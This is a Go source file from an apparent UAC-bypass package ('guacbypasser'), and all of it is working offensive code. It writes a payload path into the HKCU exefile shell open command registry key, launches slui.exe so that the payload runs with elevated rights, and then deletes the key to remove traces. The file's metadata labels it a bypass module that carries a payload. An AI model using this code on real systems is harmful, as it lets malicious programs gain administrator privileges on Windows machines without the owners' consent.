package guacbypasser

import (
	"os/exec"
	"path/filepath"
	"time"

	"golang.org/x/sys/windows/registry"
)

func tSlui(path string) error {
	_ = Reporter{
		Name: "Slui",
		Desc: "Bypass UAC using slui and registry key manipulation",
		Id:   10,

		Type:   "Once",
		Module: "tSlui",

		Fixed:   true,
		FixedIn: "17134",

		Admin:   false,
		Payload: true,
	}

	fullPath, err := filepath.Abs(path)
	if err != nil {
		return err
	}
	if _, _, err = registry.CreateKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.SET_VALUE|registry.ALL_ACCESS); err != nil {

		return err
	}
	wk32, err := registry.OpenKey(
		registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`,
		registry.QUERY_VALUE|registry.SET_VALUE,
	)
	defer wk32.Close()
	if err != nil {
		return err
	}

	if err := wk32.SetStringValue("", fullPath); err != nil {
		return err
	}
	if err := wk32.SetStringValue("DelegateExecute", ""); err != nil {
		return err
	}
	time.Sleep(3 * 1 * time.Second)
	cmd := exec.Command("slui.exe")
	if err := cmd.Run(); err != nil {
		return err
	}
	time.Sleep(3 * 1 * time.Second)

	// Absolutly delete registry key "Software\Classes\exefile\shell\open\command" ...
	if err = registry.DeleteKey(registry.CURRENT_USER, `Software\Classes\exefile\shell\open\command`); err != nil {
		return err
	}

	return nil
}
